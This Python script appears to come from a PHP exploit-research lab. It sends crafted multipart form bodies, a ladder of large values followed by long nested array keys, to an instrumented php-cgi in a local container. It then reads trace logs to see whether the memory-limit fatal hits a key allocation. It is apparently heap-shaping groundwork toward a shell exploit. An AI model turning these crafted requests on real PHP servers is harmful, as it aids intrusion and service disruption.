#!/usr/bin/env python3
"""php2shell lab, oom27: CGI instrument — park free in the big-key band.

Instrument (phpbuild:/usr/src/php-8.2.34, instrumented php-cgi):
  TRACE alloc size=<ask> real=<r> free=<limit-real>   (asks >=1024B)
  TRACE keycommit stage=<s> elem=<n> free=<free>      (post-commit, str-variant)
  TRACE keyok stage=<s> elem=<n>                      (key alloc survived)
  TRACE resize from=<a> to=<b> bytes=<ask> free_before=<free> stage=<s>
Death on key = "Allowed memory size" fatal AND a keycommit whose keyok is missing.

Ladder: descending values park free near ~2-10KB, then K nested 4KB-key parts.
The key (ask ~4352B) is the biggest ask in the tail -> near the wall it is the
most likely fatal. Each shot is a fresh php-cgi process (no restart protocol).
"""
import subprocess, sys, re

PORT = None  # unused; CGI mode
BIN = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"

def part_value(name, val):
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + name + b'"\r\n\r\n'
            + val + b"\r\n")

def part_key(name):
    return (b'--BOUND\r\nContent-Disposition: form-data; name="a[' + name + b']"\r\n\r\n\r\n')

def build(ladder, keys, keylen=4000):
    ps = []
    for i, v in enumerate(ladder):
        ps.append(part_value(b"f%d" % i, b"V" * v))
    for i in range(keys):
        ps.append(part_key(b"k" + b"K" * keylen + b"%d" % i))
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def send(body, limit="128M"):
    p = subprocess.run(
        ["docker", "exec", "-i", "phpbuild", "sh", "-c",
         "REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
         "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
         "%s -d memory_limit=%s -d post_max_size=4096M -d max_input_vars=100000 2>/tmp/e.log >/tmp/o.log; "
         "echo RC=$?; tail -2 /tmp/e.log" % (len(body), BIN, limit)],
        input=body, capture_output=True, timeout=120)
    out = p.stdout.decode("latin1")
    rc = re.search(r"RC=(\d+)", out)
    trace = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                            "cat /tmp/e.log"], capture_output=True).stdout.decode("latin1")
    return (int(rc.group(1)) if rc else -1, out, trace)

def analyze(trace):
    fatal = "Allowed memory size" in trace
    commits = [m for m in re.finditer(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", trace)]
    oks = len(re.findall(r"TRACE keyok", trace))
    last_commit = commits[-1].group(0) if commits else None
    # find the keycommit whose keyok is missing = last commit if count mismatch
    key_death = fatal and len(commits) > oks
    allocs = re.findall(r"TRACE alloc size=(\d+) real=\d+ free=(\d+)", trace)
    last_alloc = allocs[-1] if allocs else None
    return dict(fatal=fatal, ncommits=len(commits), noks=oks,
                key_death=key_death, last_commit=last_commit, last_alloc=last_alloc)

def main():
    print("oom27: CGI instrument probe", flush=True)
    # ladder: big values down to small, then big keys
    ladder = [300_000] * 20 + [150_000, 100_000, 64_000, 32_000, 16_000, 8_000, 4_000, 2_000]
    body = build(ladder, keys=6, keylen=4000)
    print("body=%d bytes" % len(body), flush=True)
    rc, out, trace = send(body)
    r = analyze(trace)
    print("rc=%s fatal=%s commits=%s oks=%s KEY_DEATH=%s" % (rc, r["fatal"], r["ncommits"], r["noks"], r["key_death"]), flush=True)
    print("last_commit:", r["last_commit"], flush=True)
    print("last_alloc:", r["last_alloc"], flush=True)
    tail = [l for l in trace.splitlines() if "keycommit" in l or "keyok" in l or "Allowed memory" in l]
    print("--- tail of key events ---", flush=True)
    for l in tail[-8:]:
        print(" ", l, flush=True)

if __name__ == "__main__":
    main()
